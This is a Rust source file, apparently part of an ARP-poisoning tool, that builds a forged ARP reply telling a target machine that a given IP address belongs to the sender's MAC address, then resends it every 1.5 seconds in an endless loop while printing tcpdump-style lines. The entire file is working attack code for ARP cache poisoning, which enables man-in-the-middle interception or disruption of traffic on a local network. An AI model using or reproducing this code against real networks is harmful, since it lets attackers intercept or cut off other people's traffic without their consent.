// File: link.rs

use colored::*;
use pnet::datalink::{self, MacAddr};
use pnet::datalink::Channel::Ethernet;
use pnet::packet::MutablePacket;
use pnet::packet::arp::{MutableArpPacket, ArpHardwareTypes, ArpOperation};
use pnet::packet::ethernet::{EtherTypes, MutableEthernetPacket};
use std::net::Ipv4Addr;
use std::process::exit;
use std::{thread, time};

#[derive(Clone, Debug)]
pub struct ArpoisonReply {
    host:   Ipv4Addr,
    mac:    MacAddr,
    target: Ipv4Addr,
    t_mac:  MacAddr,
}

impl ArpoisonReply {
    pub fn new(ahost: Ipv4Addr, amac: MacAddr, atarget: Ipv4Addr, atmac: MacAddr) -> ArpoisonReply {
        ArpoisonReply {
            host:   ahost,
            mac:    amac,
            target: atarget,
            t_mac: atmac,
        }
    }

    pub fn tcpdump_output(&self) {
        println!(
            "{} -> {} {} is-at {}",
            format!("{}", &self.mac).bright_yellow().on_black(),
            format!("{}", &self.t_mac).bright_red().on_black(),
            format!("{}", &self.host).bright_magenta().on_black(),
            format!("{}", &self.mac).black().on_yellow(),
        )
    }
}

pub fn send_arp_loop<'a>(interface: &'a datalink::NetworkInterface,
                         reply: &'a ArpoisonReply) {

    let (mut tx, _) = match datalink::channel(interface, Default::default()){
        Ok(Ethernet(tx, rx)) => (tx, rx),
        Ok(_) => panic!("Completely unknown channel type"),
        Err(_) => {
            eprintln!("{}", "Unable to create datalink channel".black().on_red());
            eprintln!("{}", "You may need \"sudo\" or root access to send raw packets on this machine. Exiting.".black().on_red());
            exit(255);
        },
    };

    // Ethernet packet (frame)
    let mut ethernet_buf = [0u8; 42];
    let mut ethernet_frame = match MutableEthernetPacket::new(&mut ethernet_buf) {
        Some(f) => f,
        None => {
            eprintln!("{}", "Could not create mutable ethernet frame.".black().on_red());
            exit(254);
        },
    };
    ethernet_frame.set_destination(reply.t_mac);
    ethernet_frame.set_source(reply.mac);
    ethernet_frame.set_ethertype(EtherTypes::Arp);

    // Arp packet
    let mut arp_buffer = [0u8; 28];
    let mut arp_packet = MutableArpPacket::new(&mut arp_buffer).unwrap();
    arp_packet.set_hardware_type(ArpHardwareTypes::Ethernet);
    arp_packet.set_protocol_type(EtherTypes::Ipv4);
    arp_packet.set_hw_addr_len(6);
    arp_packet.set_proto_addr_len(4);
    arp_packet.set_operation(ArpOperation::new(2));
    arp_packet.set_sender_hw_addr(reply.mac);
    arp_packet.set_sender_proto_addr(reply.host);
    arp_packet.set_target_hw_addr(reply.mac);
    arp_packet.set_target_proto_addr(reply.target);

    ethernet_frame.set_payload(arp_packet.packet_mut());

    loop {
        reply.tcpdump_output();
        tx.send_to(&ethernet_frame.packet_mut(), None);
        thread::sleep(time::Duration::from_millis(1_500))
    }
}
